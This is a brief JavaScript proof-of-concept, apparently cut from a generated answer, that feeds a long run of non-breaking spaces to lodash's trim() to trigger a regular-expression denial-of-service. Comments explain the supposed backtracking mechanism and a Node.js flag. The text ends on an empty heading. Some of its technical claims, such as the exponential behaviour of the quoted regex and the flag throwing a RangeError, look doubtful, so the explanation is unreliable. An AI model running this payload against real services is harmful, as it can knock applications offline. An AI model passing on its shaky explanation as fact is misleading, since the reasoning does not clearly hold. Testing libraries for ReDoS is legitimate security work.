const _ = require('lodash');

async function exploit() {
   // The vulnerable lodash.trim() uses a regex pattern with overlapping character classes
   // and greedy quantifiers (e.g., /^[\s\u00A0]+|[\u00A0]+$/g). This configuration is 
   // susceptible to catastrophic backtracking because the engine cannot deterministically 
   // decide which part of the alternation should match boundary characters.
   const reDoSPayload = '\u00A0'.repeat(3100);

   console.log('Triggering lodash.trim() ReDoS vulnerability...');
   console.log(`Payload length: ${reDoSPayload.length} non-breaking spaces`);

   // In a vulnerable version of lodash, calling trim() on this crafted input forces the
   // regex engine to explore an exponential number of matching paths. Because 
   // string.replace() calls the regex repeatedly to find all matches, the backtrack count
   // rapidly grows past 30,000 steps. When executed with Node.js flag 
   // --regexp-backtracks-before-fallback=30000, this will throw a RangeError as soon as 
   // the limit is exceeded, visibly demonstrating the denial-of-service condition.
   _.trim(reDoSPayload);
}

await exploit();
```

### Why This Demonstrates the Vulnerability

